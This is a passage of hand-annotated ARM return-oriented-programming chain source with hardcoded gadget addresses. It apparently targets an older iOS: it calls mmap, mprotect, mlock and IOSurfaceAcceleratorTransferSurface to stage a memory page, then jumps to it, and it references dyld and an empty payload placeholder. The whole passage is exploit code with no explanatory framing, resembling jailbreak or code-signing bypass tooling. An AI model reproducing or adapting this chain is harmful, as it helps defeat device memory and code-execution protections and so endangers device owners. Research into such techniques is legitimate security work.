        dd    0                             ; -> R7
; R4=mlock R7=0
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
        dd    0                             ; -> R0
        dd    0                             ; -> R1
; R0=0 R1=0 R4=mlock R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x33D65739                    ; -> R4: mmap
        dd    0                             ; -> R7
; R4=mmap R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dd    0                             ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=0 R1=0 R2=0 R3=0 R4=mmap R7=0
        dg    0x212340B1                    ; -> PC: BLX R4 / ADD SP, #8 / POP {...PC}
        dd    0                             ; -> A0
        dd    0                             ; -> A1
        dg    0x2B87FF8D                    ; -> R4: IOSurfaceCreate
        dd    0                             ; -> R7
; R4=IOSurfaceCreate R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dd    0                             ; -> R0
; R0=0 R4=IOSurfaceCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
src64   du    L_vec_7                       ; -> R4
        dd    0                             ; -> R7
; R4=src64 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    src                           ; -> R0
; R0=&src R4=src64 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=src64 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_43                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_43 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    kIOSurfaceAddress             ; -> R0
; R0=&kIOSurfaceAddress R4=&L_var_43 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_43 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_45                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_45 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    src64                         ; -> R0
; R0=&src64 R4=&L_var_45 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_45 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8FC99                    ; -> R4: CFNumberCreate
        dd    0                             ; -> R7
; R4=CFNumberCreate R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    4                             ; -> R1
L_var_45 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=kCFAllocatorDefault R1=4 R2=L_var_45 R3=0 R4=CFNumberCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=4 R2=L_var_45 R3=0 R4=CFNumberCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_44                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_44 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8E7C5                    ; -> R4: CFDictionarySetValue
        dd    0                             ; -> R7
; R4=CFDictionarySetValue R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    dict                          ; -> R0
L_var_43 dd    0                             ; -> R1
L_var_44 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=&dict R1=L_var_43 R2=L_var_44 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_43 R2=L_var_44 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x2B87FF8D                    ; -> R4: IOSurfaceCreate
        dd    0                             ; -> R7
; R4=IOSurfaceCreate R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    dict                          ; -> R0
; R0=&dict R4=IOSurfaceCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=IOSurfaceCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    srcSurf                       ; -> R4
        dd    0                             ; -> R7
; R4=&srcSurf R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    srcSurf_                      ; -> R4
        dd    0                             ; -> R7
; R4=&srcSurf_ R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x33D65739                    ; -> R4: mmap
        dd    0                             ; -> R7
; R4=mmap R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dd    0                             ; -> R0
        dd    4096                          ; -> R1
        dd    0x01 + 0x04                   ; -> R2
        dd    0x0000 + 0x0002               ; -> R3
; R0=0 R1=4096 R2=0x01 + 0x04 R3=0x0000 + 0x0002 R4=mmap R7=0
        dg    0x212340B1                    ; -> PC: BLX R4 / ADD SP, #8 / POP {...PC}
_fd     dd    0                             ; -> A0
protmap dd    0                             ; -> A1
        du    addr                          ; -> R4
        dd    0                             ; -> R7
; R4=&addr R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x33D785E8                    ; -> R4: mprotect
        dd    0                             ; -> R7
; R4=mprotect R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    addr                          ; -> R0
        dd    4096                          ; -> R1
        dd    0x01 + 0x02                   ; -> R2
        dd    0                             ; -> R3
; R0=&addr R1=4096 R2=0x01 + 0x02 R3=0 R4=mprotect R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=4096 R2=0x01 + 0x02 R3=0 R4=mprotect R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
addr64  du    L_vec_8                       ; -> R4
        dd    0                             ; -> R7
; R4=addr64 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    addr                          ; -> R0
; R0=&addr R4=addr64 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=addr64 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_46                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_46 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    kIOSurfaceAddress             ; -> R0
; R0=&kIOSurfaceAddress R4=&L_var_46 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_46 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    L_var_48                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_48 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    addr64                        ; -> R0
; R0=&addr64 R4=&L_var_48 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_var_48 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8FC99                    ; -> R4: CFNumberCreate
        dd    0                             ; -> R7
; R4=CFNumberCreate R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        dg    0x21F1F554                    ; -> R0: kCFAllocatorDefault
        dd    4                             ; -> R1
L_var_48 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=kCFAllocatorDefault R1=4 R2=L_var_48 R3=0 R4=CFNumberCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=4 R2=L_var_48 R3=0 R4=CFNumberCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_var_47                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_var_47 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x21D8E7C5                    ; -> R4: CFDictionarySetValue
        dd    0                             ; -> R7
; R4=CFDictionarySetValue R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    dict                          ; -> R0
L_var_46 dd    0                             ; -> R1
L_var_47 dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=&dict R1=L_var_46 R2=L_var_47 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=L_var_46 R2=L_var_47 R3=0 R4=CFDictionarySetValue R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x2B87FF8D                    ; -> R4: IOSurfaceCreate
        dd    0                             ; -> R7
; R4=IOSurfaceCreate R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    dict                          ; -> R0
; R0=&dict R4=IOSurfaceCreate R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=IOSurfaceCreate R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    destSurf                      ; -> R4
        dd    0                             ; -> R7
; R4=&destSurf R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        du    destSurf_                     ; -> R4
        dd    0                             ; -> R7
; R4=&destSurf_ R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
        dg    0x33D785E8                    ; -> R4: mprotect
        dd    0                             ; -> R7
; R4=mprotect R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
        du    addr                          ; -> R0
        dd    4096                          ; -> R1
        dd    0x01 + 0x04                   ; -> R2
        dd    0                             ; -> R3
; R0=&addr R1=4096 R2=0x01 + 0x04 R3=0 R4=mprotect R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=4096 R2=0x01 + 0x04 R3=0 R4=mprotect R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x33D7A5C4                    ; -> R4: mlock
        dd    0                             ; -> R7
; R4=mlock R7=0
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
        du    addr                          ; -> R0
        dd    4096                          ; -> R1
; R0=&addr R1=4096 R4=mlock R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R1=4096 R4=mlock R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x2B87F98D                    ; -> R4: IOSurfaceAcceleratorTransferSurface
        dd    0                             ; -> R7
; R4=IOSurfaceAcceleratorTransferSurface R7=0
        dg    0x200FD555                    ; -> PC: POP {R0-R3,PC}
accel   dd    0                             ; -> R0
srcSurf dd    0                             ; -> R1
destSurf dd    0                             ; -> R2
        dd    0                             ; -> R3
; R0=accel R1=srcSurf R2=destSurf R3=0 R4=IOSurfaceAcceleratorTransferSurface R7=0
        dg    0x205F6FDF                    ; -> PC: BLX R4 / ADD SP, #12 / POP {...PC}
        dd    0                             ; -> A0
        dd    0                             ; -> A1
        dd    0                             ; -> A2
        dd    0                             ; -> R4
        dd    0                             ; -> R7
; R4=0 R7=0
        dg    0x200CDB93                    ; -> PC: POP {R4,R5,PC}
        du    L_stk_51                      ; -> R4
        du    L_stk_50                      ; -> R5
; R4=L_stk_51 R5=L_stk_50 R7=0
        dg    0x2EE58AE7                    ; -> PC: CMP R0, #0 / IT EQ / MOVEQ R4, R5 / MOV R0, R4 / POP {R4,R5,R7,PC}
        dd    0                             ; -> R4
        dd    0                             ; -> R5
        dd    0                             ; -> R7
; R4=0 R5=0 R7=0
        dg    0x20113AEC                    ; -> PC: LDMIA R0, {...SP...PC}
L_stk_51:
        dd    0                             ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R3
        dd    0                             ; -> R4
        dd    0                             ; -> R5
        dd    0                             ; -> R12
        du    4 + die                       ; -> SP
        dd    0                             ; -> R14
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
L_stk_50:
destSurf_ dd    0                             ; -> R0
        dd    0                             ; -> R1
        dd    0                             ; -> R3
        dg    0x21D8F601                    ; -> R4: CFRelease
        dd    0                             ; -> R5
        dd    0                             ; -> R12
        du    4 + L_nxt_49                  ; -> SP
        dd    0                             ; -> R14
L_nxt_49:
; R0=destSurf_ R1=0 R3=0 R4=CFRelease R5=0 R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dg    0x21D8F601                    ; -> R4: CFRelease
        dd    0                             ; -> R7
; R4=CFRelease R5=0 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
srcSurf_ dd    0                             ; -> R0
; R0=srcSurf_ R4=CFRelease R5=0 R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        du    L_ptr_52                      ; -> R4
        dd    0                             ; -> R7
; R4=&L_ptr_52 R5=0 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        du    addr                          ; -> R0
; R0=&addr R4=&L_ptr_52 R5=0 R7=0
        dg    0x200B45DD                    ; -> PC: LDR R0, [R0] / POP {R7,PC}
        dd    0                             ; -> R7
; R4=&L_ptr_52 R5=0 R7=0
        dg    0x2002E207                    ; -> PC: STR R0, [R4] / POP {R4,R7,PC}
L_ptr_52 dd    0                             ; -> R4
        dd    0                             ; -> R7
; R4=L_ptr_52 R5=0 R7=0
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dd    0                             ; -> R4
        dd    0                             ; -> R7
; R4=0 R5=0 R7=0
        dg    0x33CD09F1                    ; -> PC: exit
;
die:
;
        dg    0x20041DC9                    ; -> PC: POP {R0-R1,PC}
        dd    3                             ; -> R0
        du    L_str_9                       ; -> R1
; R0=3 R1=&L_str_9
        dg    0x20044CB3                    ; -> PC: POP {R4,PC}
        dg    0x33CB5E09                    ; -> R4: syslog
; R0=3 R1=&L_str_9 R4=syslog
        dg    0x33B32F99                    ; -> PC: BLX R4 / POP {R4,R7,PC}
        dd    0                             ; -> R4
        dd    0                             ; -> R7
; R4=0 R7=0
        dg    0x20137FF9                    ; -> PC: POP {R0,PC}
        dd    -1                            ; -> R0
; R0=-1 R4=0 R7=0
        dg    0x33CD09F1                    ; -> PC: exit
;
addr    dd    0
dict    dd    0
kIOSurfaceAddress du    L_vec_6
bPE     dd    4
size    dd    4096
pitch   dd    256
height  dd    16
width   dd    64
;-- dyld_header = ?
;-- payload = ?
outPos  dd    0
inPos   dd    0
src     dd    0
L_str_9 db    "fail", 10, 0
        align 4
L_vec_8:
        dd    0
        dd    0
L_vec_7:
        dd    0
        dd    0
L_vec_6:
        dg    0x36B5A32C                    ; -> __CFConstantStringClassReference
        dd    0x7c8
        du    L_str_5
        dd    16
L_str_5 db    "IOSurfaceAddress", 0
        align 4
L_str_4 db    'ARGB', 0
        align 4
L_str_3 db    "Sigload %x", 10, 0
        align 4
L_vec_2:
        dd    0
        dd    0
        dd    0
        dd    0
L_str_1 db    "/usr/lib/dyld", 0
        align 4
L_vec_0:
        dd    0x20000000
        dd    0
